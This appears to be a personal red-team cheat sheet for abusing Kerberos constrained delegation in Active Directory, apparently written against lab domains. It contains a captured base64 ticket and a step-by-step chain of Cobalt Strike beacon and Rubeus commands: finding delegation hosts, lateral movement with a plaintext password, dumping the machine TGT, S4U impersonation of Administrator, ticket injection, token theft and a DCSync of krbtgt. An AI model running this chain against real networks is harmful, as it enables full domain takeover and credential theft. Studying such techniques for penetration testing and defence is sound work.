
```
doIFhDCCBYCgAwIBBaEDAgEWooIEjDCCBIhhggSEMIIEgKADAgEFoQ4bDFBBSU5URVJTLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFJTlRFUlMuSFRCo4IERDCCBECgAwIBEqEDAgECooIEMgSCBC5ybJ0egC+ays7VvbLD0ppd07mnhZhl2FlCzC5SmIO/B7PMwiOKYSN1kXvp/7+XN8FUXQVi8i6SiBh7I689Z5utcRCVPYXF9El8pybsrYaOybbdoyPoscwBziUMblixySVxbyjF6HWV4NWYj74GST09wDV8MY1DycoZWaSMlIdS/m1LdeB2gFU6aH8Y+vm5R6s3an1gWNo6evTKQuEA57j+5FvkGtivzX9mjKX+Yw2hkUF0Yfa21DrY+RPAd+abwJOfFsDYjBJIm4HOYy/0POTFUUQlSg5HOrXEtrv8qn9dpco3dH4NAbiCyECypW4tbV3Oq8o0FwYBvZkgcT1Bq91CxPUo/q6Wdr0K0rmJw4/tTQzHCZOQLg9qi/EV9Qs1MutKJ8qRoUmoXWlKHx6KdbY33oUVc59Xb1HrxkgfNeeptgejvKRyQLqzHy2I+hUgLtoEsiKRtJOyv9/23Ukka9PQeOD3unoq7G8lIhfTvYredSQAEKKoBglFDQDhSpJrRw47rCTbioiAx+EUADEnXJs7HMizUfnb3JnkNdFMlo1v8Wo1U+/VWRM/kVZ+9WA95FKCPwcmSKNJASfACQdh8xugghQJLp5AemYA37+O4D39f4eKxtHp+n4uYOAEoiDtEY9FQJxoj0+6ieaaVJ5/8UaK33jzfd842MoEb/G+AanUKP/efC3nri57f6gnzSGVcYmC9ADAU18IQY4DO8z3zjRaXkiwLxNivpbpursqrkczhCjucRDwNrDWh0pcw/cpSPYXsoBcS590hkAZbBGLQZmuyHo2CjDSqDTkwJkPUufblcIO/wuu9fdPBGL4U1eYqggH0+SrtwrEPAcu8HbVKPBbiZWuo9IFbTPdFhnScdwAGUA+n1RD3PURNxb5ZNMdeNeD8L8UWYUIGzQ2yCuZPvVERNNMhkAmCFDopM8ljuq14at4XSWvRSasTFRDOYyk+p0rQ8Em89G2D2dn1WsgIZgRCpPcoE9a3oBjKHUxLbz0lPwu41DAPs4pS9DXKbjMG1AjjRi3abZQBa8aol3ApYL4sUZFVX4NEgD7R0IaE8pHG7RauvDA5+hGKbW+ual4nNs3QGp0qTCv36IdhX63rzQuwMnpvu6SOKB1DRBf4TCLaEegIfX8a+H0mJ58KqJuTHJgFoZ/pdhkrJ5sHG8jRmqEnWReiXLPpyYtEDKgL8iUbsN2K2wXVp5IBlRAf4P3F0dyY98a4MA4dQNtZfN4Bqo6PyegnETUXiAwNxmn/Hx1tVdW/NpjAYQWHi/DQj9POqkVikYA5d6MSElCfepSfqKXUAepWumImoF4ajpdKuGTEvXBes8/zbevDsUFUgtq32Bak/DucBwDLTolVjNnEBBPB6mvtPqquy+pJ8+yACNie87YDDgFmicR22bseJdLZRK40otT2TGlm+74UUlwL6OB4zCB4KADAgEAooHYBIHVfYHSMIHPoIHMMIHJMIHGoCswKaADAgESoSIEIDzJZ2LwiSJV9Erqg06eRkzCQplJID0/RBrNWpbixKmcoQ4bDFBBSU5URVJTLkhUQqISMBCgAwIBAaEJMAcbBWJsYWtlowcDBQBA4QAApREYDzIwMjUwODE0MTY1MTQxWqYRGA8yMDI1MDgxNDE3NTE0MVqnERgPMjAyNTA4MTQxNzUxNDFaqA4bDFBBSU5URVJTLkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFJTlRFUlMuSFRC
```

```
kerbeus s4u /impersonateuser:Administrator /domain:painters.htb /service:HTTP/dc.painters.htb /altservice:cifs /ticket
```
##### Constrained Delegation
Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Check the UAC value to see if protocol transitioning is possible 
```powershell
ldapsearch (&(samAccountType=805306369)(samaccountname=DUB-WEB-1$)) --attributes userAccountControl
```

We want true
```powershell
[Convert]::ToBoolean(16781312 -band 16777216)
```

Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
```powershell
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
```


> Couple options here: 

1.  Perform the S4U abuse to obtain a usable service ticket using service name substitution

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1.contoso.com /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
```

> Use the FQDN for the services to avoid oopsies

2. Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value,

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1.contoso.com /impersonateuser:Administrator /nowrap /ticket:
```

---

 Inject the ticket into a sacrificial logon session.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
```

 Impersonate the process and verify
```powershell
steal_token [PID]
run klist

ls \\lon-fs-1\c$
dcsync CONTOSO.COM CONTOSO\krbtgt
```